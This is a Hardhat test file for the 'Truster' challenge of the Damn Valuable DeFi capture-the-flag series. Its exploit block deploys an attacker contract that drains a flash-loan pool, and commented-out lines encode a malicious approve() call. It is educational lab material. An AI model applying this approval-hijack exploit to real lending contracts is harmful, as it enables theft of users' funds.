const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */

        const attackToken = this.token.connect(attacker);
        const balance = await attackToken.balanceOf(attacker.address);
        const poolBalance = await attackToken.balanceOf(this.pool.address);

        console.log("Attacker balance:", balance.toString())
        console.log("Pool balance:", poolBalance.toString())

        // const abi = ["function approve(address spender, uint256 amount)"]
        // const iface = new ethers.utils.Interface(abi);
        // const data = iface.encodeFunctionData("approve", [this.pool.address, TOKENS_IN_POOL]);

        const TrusterAttackContract = await ethers.getContractFactory('TrusterAttacker', attacker);
        this.trusterAttacker = await TrusterAttackContract.deploy(this.pool.address, this.token.address);
        
        const allowance = await attackToken.allowance(this.pool.address, attacker.address);
        console.log("Allowance:", allowance.toString());
        const allowance2 = await attackToken.allowance(this.pool.address, this.trusterAttacker.address);
        console.log("Allowance2:", allowance2.toString());
        await this.trusterAttacker.attack(attacker.address);


                
        const allowanc3 = await attackToken.allowance(this.pool.address, attacker.address);
        const balance2 = await attackToken.balanceOf(attacker.address);
        const poolBalance2 = await attackToken.balanceOf(this.pool.address);

        console.log("Attacker balance:", balance2.toString())
        console.log("Pool balance:", poolBalance2.toString())
        console.log("Allowance:", allowance2.toString());
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

